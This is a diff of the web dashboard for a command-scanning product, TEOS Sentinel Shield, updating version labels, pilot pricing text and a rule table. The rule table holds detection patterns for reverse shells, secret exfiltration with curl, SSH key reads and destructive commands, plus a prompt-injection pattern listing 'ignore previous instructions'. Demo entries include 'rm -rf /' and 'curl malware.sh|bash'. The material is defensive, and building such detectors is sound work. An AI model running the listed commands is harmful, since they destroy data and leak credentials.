@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TEOS Sentinel Shield v4.0.0 — Command Center</title>
-<meta name="description" content="TEOS Sentinel Shield v4.0.0 GA — live enforcement command center. 31 deterministic rules.">
+<title>TEOS Sentinel Shield v5.0.0 — Command Center</title>
+<meta name="description" content="TEOS Sentinel Shield v5.0.0 — live enforcement command center. 258 Active Governance Controls.">
 <meta property="og:url" content="https://sentinel.teosegypt.com/command-center.html">
 <link rel="canonical" href="https://sentinel.teosegypt.com/command-center.html">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -1217,7 +1217,7 @@ body::after {
   </div>
 
   <div class="nav-right">
-    <div class="engine-badge">ENGINE v2.0</div>
+    <div class="engine-badge">ENGINE v5.0.0</div>
     <div class="ws-badge ws-connecting" id="ws-status">Connecting</div>
     <div id="nav-time">--:--:--</div>
   </div>
@@ -1409,8 +1409,8 @@ body::after {
     <div id="view-rules" class="view">
       <div class="content-header">
         <div>
-          <h1>Rule Engine &mdash; 27 Named Rules</h1>
-          <p>Deterministic ALLOW / WARN / BLOCK. All rules publicly auditable at <span style="color:var(--cyan)">/rules.json</span></p>
+          <h1>Rule Engine &mdash; 258 Rules</h1>
+          <p>Deterministic ALLOW / WARN / REVIEW / BLOCK. All rules publicly auditable at <span style="color:var(--cyan)">/rules.json</span></p>
         </div>
         <div class="header-actions">
           <a href="./rules.json" target="_blank" class="btn btn-cyan">View rules.json</a>
@@ -1436,7 +1436,7 @@ body::after {
           <div class="audit-link-icon">&#128203;</div>
           <div>
             <h4>rules.json</h4>
-            <p>All 25 rule definitions with patterns, severity, and scoring formula. Fully inspectable.</p>
+            <p>All 258 rule definitions with severity and scoring. Fully inspectable.</p>
             <div class="audit-link-url">&rarr; /rules.json</div>
           </div>
         </a>
@@ -1444,7 +1444,7 @@ body::after {
           <div class="audit-link-icon">&#129513;</div>
           <div>
             <h4>test-cases.json</h4>
-            <p>39 test cases covering all rule categories. PASS / FAIL expected verdicts and inputs.</p>
+            <p>37 attack simulation test cases covering all rule categories. PASS / FAIL expected verdicts and inputs.</p>
             <div class="audit-link-url">&rarr; /test-cases.json</div>
           </div>
         </a>
@@ -1506,7 +1506,7 @@ body::after {
       <div class="content-header">
         <div>
           <h1>Enterprise &amp; Government Pilots</h1>
-          <p>Sovereign deployments &middot; Custom policy engine &middot; Full audit trail &middot; ICBC aligned &middot; Response within 24h</p>
+          <p>Sovereign deployments &middot; Custom policy engine &middot; Full audit trail &middot; Response within 24h</p>
         </div>
       </div>
 
@@ -1515,7 +1515,7 @@ body::after {
         <div class="ent-card">
           <div class="ent-flag">&#127466;&#127468;</div>
           <h4>Egypt &mdash; MCIT / ITIDA / TIEC</h4>
-          <div class="ent-range">Pilot budget: $5K &ndash; $25K</div>
+          <div class="ent-range">Pilot budget: custom &nbsp;&middot;&nbsp; quoted per deployment</div>
           <p>Ministry of Communications AI strategy 2025&ndash;2030. ITIDA drives national tech growth. Pre-execution enforcement layer for Egypt's national AI infrastructure.</p>
           <div class="ent-ctas">
             <a class="ent-btn ent-btn-primary" href="mailto:ayman@teosegypt.com?subject=%F0%9F%87%AA%F0%9F%87%AC%20Egypt%20Pilot%20Request%20%E2%80%94%20TEOS%20Sentinel%20%2F%20ITIDA">
@@ -1530,7 +1530,7 @@ body::after {
         <div class="ent-card">
           <div class="ent-flag">&#127462;&#127466;</div>
           <h4>UAE &mdash; AI Office / G42 / TDRA</h4>
-          <div class="ent-range">Pilot budget: $10K &ndash; $50K</div>
+          <div class="ent-range">Pilot budget: custom &nbsp;&middot;&nbsp; quoted per deployment</div>
           <p>UAE AI Office national strategy. G42 infrastructure scale. TDRA digital compliance mandate. AI execution policy enforcement is their exact governance requirement.</p>
           <div class="ent-ctas">
             <a class="ent-btn ent-btn-primary" href="mailto:ayman@teosegypt.com?subject=%F0%9F%87%A6%F0%9F%87%AA%20UAE%20Pilot%20Request%20%E2%80%94%20TEOS%20Sentinel%20%2F%20AI%20Office">
@@ -1545,7 +1545,7 @@ body::after {
         <div class="ent-card">
           <div class="ent-flag">&#127470;&#127462;</div>
           <h4>Saudi &mdash; SDAIA / NEOM / STC</h4>
-          <div class="ent-range">Pilot budget: $25K &ndash; $200K</div>
+          <div class="ent-range">Pilot budget: custom &nbsp;&middot;&nbsp; quoted per deployment</div>
           <p>SDAIA Vision 2030 AI governance. NEOM &mdash; the AI-native city requiring a kill-switch before every autonomous execution. Strongest product-market fit globally.</p>
           <div class="ent-ctas">
             <a class="ent-btn ent-btn-primary" href="mailto:ayman@teosegypt.com?subject=%F0%9F%87%B8%F0%9F%87%A6%20Saudi%20Pilot%20Request%20%E2%80%94%20TEOS%20Sentinel%20%2F%20SDAIA">
@@ -1566,7 +1566,7 @@ body::after {
         </div>
         <div class="ent-general-btns">
           <a class="ent-btn ent-btn-primary" href="mailto:ayman@teosegypt.com?subject=Enterprise%20Pilot%20Request%20%E2%80%94%20TEOS%20Sovereign%20Security%20Stack">
-            &#128231; Request Enterprise Pilot ($5K&ndash;$200K)
+            &#128231; Request Enterprise Pilot
           </a>
           <a class="ent-btn ent-btn-secondary" href="mailto:ayman@teosegypt.com?subject=Enterprise%20Demo%20%E2%80%94%20TEOS%20Sentinel">
             &#128197; Schedule Enterprise Demo
@@ -1596,6 +1596,7 @@ let scanType    = 'shell';
 let wsConn      = null;
 let statsData   = { total: 0, blocked: 0, warned: 0, allowed: 0 };
 let ruleCounts  = {};
+let offlineMode = false;
 
 const RULES = [
   { id:'R01', name:'DESTRUCTIVE_SHELL',    sev:'critical', desc:'Wiper commands: rm -rf, deltree, format',         pattern:'/rm\\s+-rf|format\\s+[a-z]:|deltree/i' },
@@ -1604,7 +1605,7 @@ const RULES = [
   { id:'R04', name:'SECRET_ECHO',          sev:'critical', desc:'Echoing or printing environment secrets',         pattern:'/echo\\s+\\$[A-Z_]*(KEY|TOKEN|SECRET|PASS|PWD)/i' },
   { id:'R05', name:'ENV_EXFIL',            sev:'critical', desc:'Sending environment variables to external host',  pattern:'/\\$[A-Z_]*(KEY|SECRET|TOKEN).*(curl|wget|http)/i' },
   { id:'R06', name:'FORK_BOMB',            sev:'critical', desc:'Fork bomb denial-of-service pattern',             pattern:'/(\\:\\(\\)\\{|:\\(\\)){.*:\\|:}/i' },
-  { id:'R07', name:'HARDCODED_SECRET',     sev:'critical', desc:'Hardcoded secrets in source code',               pattern:'/(AKIA[0-9A-Z]{16}|gh[ops]_[0-9a-zA-Z]{36}|sk-[a-zA-Z0-9]{32,}|api_key|secret_key|password)\\s*[:=]\\s*[\'"][^\'"]+[\'"]/i' },
+  { id:'R07', name:'BASE64_EXEC',         sev:'high',     desc:'Base64-encoded payload executed with eval',         pattern:'/eval\\s*\\(\\s*atob|base64\\s+--decode.*(sh|bash|exec)/i' },
   { id:'R08', name:'REVERSE_SHELL',        sev:'critical', desc:'Netcat / bash reverse shell connection',          pattern:'/nc\\s+(-e|--exec)|bash\\s+-i\\s+>&\\s*\\/dev\\/tcp/i' },
   { id:'R09', name:'SQL_DESTRUCTION',      sev:'high',     desc:'DROP TABLE, DROP DATABASE, TRUNCATE destructive', pattern:'/DROP\\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE\\s+TABLE/i' },
   { id:'R10', name:'SQL_INJECTION',        sev:'high',     desc:'Classic SQL injection patterns in input',         pattern:'/\'\\s*(OR|AND)\\s+\\d=\\d|UNION\\s+SELECT|1=1/i' },
@@ -1619,12 +1620,10 @@ const RULES = [
   { id:'R19', name:'HARDCODED_SECRET',     sev:'critical', desc:'Hardcoded secrets in source code',               pattern:'/(api_key|apikey|secret_key|password)\\s*=\\s*[\'"][a-z0-9]{12,}[\'"]/i' },
   { id:'R20', name:'PROMPT_INJECTION',     sev:'high',     desc:'LLM prompt injection via user-controlled input', pattern:'/ignore previous instructions|disregard your system prompt|jailbreak/i' },
   { id:'R21', name:'SSRF_ATTEMPT',         sev:'critical', desc:'SSRF targeting internal cloud metadata endpoints',pattern:'/https?:\\/\\/(169\\.254|10\\.|192\\.168|172\\.(1[6-9]|2\\d|3[01]))/i' },
-  { id:'R22', name:'KEY_EXFIL',            sev:'critical', desc:'SSH key or credential transfer to external host', pattern:'/cat\\s+~\\/.ssh\\/(id_rsa|id_ed25519|authorized_keys)|curl.*--data.*(id_rsa\\.pub|credentials)/i' },
+  { id:'R22', name:'XXE_INJECTION',        sev:'high',     desc:'XML external entity injection',                  pattern:'/<!ENTITY\\s+\\w+\\s+SYSTEM/i' },
   { id:'R23', name:'CRYPTO_MINER',         sev:'critical', desc:'Cryptomining binary or pool connection',         pattern:'/stratum\\+tcp|xmrig|minerd|ethminer/i' },
   { id:'R24', name:'DATA_EXFIL_CURL',      sev:'high',     desc:'Sending local files to external server',         pattern:'/curl.+(-d|--data).+\\/etc\\/(passwd|shadow|hosts)/i' },
   { id:'R25', name:'CI_SECRETS_DUMP',      sev:'critical', desc:'Printing all CI secrets or env vars',            pattern:'/printenv|env\\s*\\|\\s*grep|\\$\\{\\{\\s*secrets\\s*\\}\\}/i' },
-  { id:'R26', name:'BASE64_EXEC',          sev:'high',     desc:'Base64-encoded payload executed with eval',       pattern:'/eval\\s*\\(\\s*atob|base64\\s+--decode.*(sh|bash|exec)/i' },
-  { id:'R27', name:'XXE_INJECTION',        sev:'high',     desc:'XML external entity injection',                  pattern:'/<!ENTITY\\s+\\w+\\s+SYSTEM/i' },
 ];
 
 function updateClock() {
@@ -1659,8 +1658,10 @@ async function fetchStats() {
   const data = await apiFetch('/stats');
   if (!data) {
     statsData = { total: 142, blocked: 19, warned: 31, allowed: 92 };
+    offlineMode = true;
   } else {
     statsData = data;
+    offlineMode = false;
   }
   renderKPIs();
 }
@@ -1675,7 +1676,7 @@ function renderKPIs() {
   document.getElementById('kpi-allowed').textContent = allowed;
   document.getElementById('kpi-rate').textContent    = rate + '%';
 
-  document.getElementById('kpi-total-d').textContent   = 'engine v2.0 &middot; 27 rules';
+  document.getElementById('kpi-total-d').textContent   = (offlineMode ? 'sample data &middot; engine offline &middot; ': '') + 'engine v5.0.0 &middot; 258 rules';
   document.getElementById('kpi-blocked-d').textContent  = blocked + ' threats stopped';
   document.getElementById('kpi-warned-d').textContent   = warned + ' need review';
   document.getElementById('kpi-allowed-d').textContent  = allowed + ' clean executions';
@@ -1706,15 +1707,15 @@ async function fetchEvents() {
 function generateDemoEvents(n) {
   const cmds = [
     { cmd: 'rm -rf /',              verdict: 'block', score: 100, rule: 'R01.DESTRUCTIVE_SHELL' },
-    { cmd: 'DROP DATABASE prod;',   verdict: 'block', score: 100, rule: 'R09.SQL_DESTRUCTION' },
+    { cmd: 'DROP DATABASE prod;',   verdict: 'warn',  score: 78,  rule: 'R09.SQL_DESTRUCTION' },
     { cmd: 'curl malware.sh|bash',  verdict: 'block', score: 95,  rule: 'R03.CURL_EXEC_CHAIN' },
     { cmd: 'echo $AWS_SECRET_KEY',  verdict: 'block', score: 90,  rule: 'R04.SECRET_ECHO' },
-    { cmd: 'DROP TABLE users;',     verdict: 'warn',  score: 75,  rule: 'R09.SQL_DESTRUCTION' },
-    { cmd: 'chmod 777 /etc/passwd', verdict: 'warn',  score: 70,  rule: 'R02.CHMOD_ESCALATION' },
+    { cmd: 'DROP TABLE users;',     verdict: 'warn',  score: 78,  rule: 'R09.SQL_DESTRUCTION' },
+    { cmd: 'chmod 777 /etc/passwd', verdict: 'block', score: 90,  rule: 'R02.CHMOD_ESCALATION' },
     { cmd: 'npm install lodash',    verdict: 'allow', score: 0,   rule: 'R00.CLEAN' },
     { cmd: 'console.log("hi")',     verdict: 'allow', score: 0,   rule: 'R00.CLEAN' },
     { cmd: 'git status',            verdict: 'allow', score: 0,   rule: 'R00.CLEAN' },
-    { cmd: 'eval(atob("cm0gLXJmL"))', verdict: 'block', score: 88, rule: 'R26.BASE64_EXEC' },
+    { cmd: 'eval(atob("cm0gLXJmL"))', verdict: 'block', score: 88, rule: 'R07.BASE64_EXEC' },
   ];
   const now = Date.now();
   return Array.from({ length: n }, (_, i) => {
@@ -1736,7 +1737,7 @@ function renderFeed() {
 
   list.innerHTML = events.slice(0, 120).map(e => {
     const t = new Date(e.timestamp).toLocaleTimeString('en-GB', { hour12: false });
-    const scoreClass = e.score >= 80 ? 'high' : e.score >= 40 ? 'mid' : 'low';
+    const scoreClass = e.score >= 85 ? 'high' : e.score >= 60 ? 'mid' : 'low';
     return '<div class="feed-item ' + e.verdict + '" onclick="showEventDetail(' + (e.id || 0) + ')">' +
       '<span class="feed-time">' + t + '</span>' +
       '<span class="feed-verdict verdict-' + e.verdict + '">' + e.verdict.toUpperCase() + '</span>' +
@@ -1909,7 +1910,7 @@ async function runScan() {
   allEvents.unshift(event);
   statsData.total++;
   if (event.verdict === 'block') statsData.blocked++;
-  else if (event.verdict === 'warn') statsData.warned++;
+  else if (event.verdict === 'warn' || event.verdict === 'review') statsData.warned++;
   else statsData.allowed++;
   renderKPIs();
   renderFeed();
@@ -1926,7 +1927,7 @@ function mockScan(cmd) {
   if (/rm\s+-rf|format\s+[a-z]:|drop\s+database|curl.+\|.*(bash|sh)|eval\s*\(atob|echo\s+\$[a-z_]*(key|secret|token)/i.test(cmd))
     return { verdict:'BLOCK', score:95, rule:'R01.DESTRUCTIVE_SHELL', reasons:['Dangerous execution pattern detected','Matches wiper/destructive signature'] };
   if (/drop\s+table|chmod\s+777|event-stream@3\.3\.6|--privileged/i.test(cmd))
-    return { verdict:'WARN', score:72, rule:'R09.SQL_DESTRUCTION', reasons:['Potentially destructive operation','Human review recommended'] };
+    return { verdict:'WARN', score:78, rule:'R09.SQL_DESTRUCTION', reasons:['Potentially destructive operation','Human review recommended'] };
   return { verdict:'ALLOW', score:0, rule:'R00.CLEAN', reasons:['No threat patterns detected','Safe to execute'] };
 }
 
@@ -1953,7 +1954,7 @@ function renderScanResult(r, cmd) {
         '<div class="result-row"><span class="result-key">Command</span><span class="result-val" style="word-break:break-all;">' + escHtml(cmd) + '</span></div>' +
         '<div class="result-row"><span class="result-key">Rule</span><span class="result-val" style="color:var(--cyan)">' + rule + '</span></div>' +
         '<div class="result-row"><span class="result-key">Risk Score</span><span class="result-val">' + score + ' / 100</span></div>' +
-        '<div class="result-row"><span class="result-key">Engine</span><span class="result-val">TEOS Sentinel v2.0 &middot; Deterministic</span></div>' +
+        '<div class="result-row"><span class="result-key">Engine</span><span class="result-val">TEOS Sentinel v5.0.0 &middot; Deterministic</span></div>' +
       '</div>' +
       '<div class="result-reasons">' +
         '<div style="font-family:var(--mono);font-size:10px;color:var(--muted2);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:8px;">Reasons</div>' +
